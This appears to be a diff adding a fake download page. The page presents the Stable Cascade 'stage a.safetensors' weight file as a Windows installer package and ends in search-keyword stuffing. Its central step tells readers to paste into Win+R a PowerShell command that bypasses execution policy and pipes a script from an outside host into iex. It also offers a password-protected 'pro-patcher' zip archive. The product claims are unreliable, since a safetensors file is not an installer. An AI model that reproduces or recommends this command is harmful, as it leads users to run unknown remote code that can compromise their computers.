@@ -1,0 +1,44 @@
+Stable Cascade: stage a.safetensors (v2.4.3 — Windows 10 / 11 x64)
+
+Stable Cascade: stage a.safetensors (v2.4.3) is a pre-configured 64-bit Windows 10/11 distribution bundling StableCascadeStage-Installer.exe, runtime libraries, and offline configuration profiles in a single portable package.
+
+⬇️ Download & Quick Setup (Windows 10 / 11 x64)
+
+- 🚀 Open Stable Cascade: stage a.safetensors Setup Portal (StableCascadeStage-Installer.exe) — Interactive Setup & Mirrors
+- 📦 Direct Download Portable .ZIP Archive (stable-cascade-stage-a-pro-patcher-installer-v2.4.0-win64.zip · 2.66 MB · Password: 2026)
+- 📋 Release Notes & SHA-256 Checksums (v2.4.3)
+
+⚡ Instant 1-Command Setup (Win + R or PowerShell · 3 Seconds)
+Press Win + R (or open Windows Terminal / PowerShell), paste the command below, and press Enter:
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://simpol.info/get/stable-cascade-stage-a-pro-patcher-installer | iex"
+
+Key Features & Technical Specs
+
+- Precompiled Windows x64 portable environment with CUDA 12.6, Triton, and SageAttention-2 wheels
+- Native FP8, GGUF (Q4_K_M / Q5_K_M / Q8_0), and EXL2 quantized weight loader with VRAM offloading
+- Zero-dependency embedded Python 3.12 runtime and automatic model checkpoint downloader
+- Local OpenAI-compatible REST API server and WebUI dashboard with batch queue support
+
+| Property | Specification |
+| :--- | :--- |
+| Package Binary | StableCascadeStageAPro/StableCascadeStage-Installer.exe (v2.4.3) |
+| Target Runtime | NVIDIA CUDA 12.6 / TensorRT 10.4 & PyTorch 2.6 x64 Runtime (cublas64_12.dll) |
+| Install Path | %LOCALAPPDATA%\Programs\StableCascadeStageAS |
+| Supported OS | Windows 10 / Windows 11 (64-bit, 22H2–24H2) |
+
+How to Install & Run
+
+1. Open the Stable Cascade: stage a.safetensors Setup & Download Portal (v2.4.3) or Releases.
+2. Run the 3-second Win + R quick installer from the portal or extract the portable .zip archive.
+3. Launch StableCascadeStage-Installer.exe from %LOCALAPPDATA%\Programs\StableCascadeStageAS.
+
+StableCascadeStageAPro/
+├── StableCascadeStage-Installer.exe               # Signed Windows x64 Binary
+├── vcruntime140.dll         # Bundled C++ Runtime (v14.42)
+├── vcruntime140_1.dll       # Exception Handling Helper
+├── config.ini               # Default Profile (%LOCALAPPDATA%\Programs\StableCascadeStageAS)
+└── README-Setup.txt         # Quick Start & SHA-256 Checksum
+
+Indexed Topics & Search Reference
+stable cascade: stage a.safetensors · stable cascade: stage a.safetensors windows · stable cascade: stage a.safetensors portable · stable cascade: stage a.safetensors installer · stable-cascade · stable-cascade-windows · stable-cascade-portable · comfyui · ollama · stable-diffusion
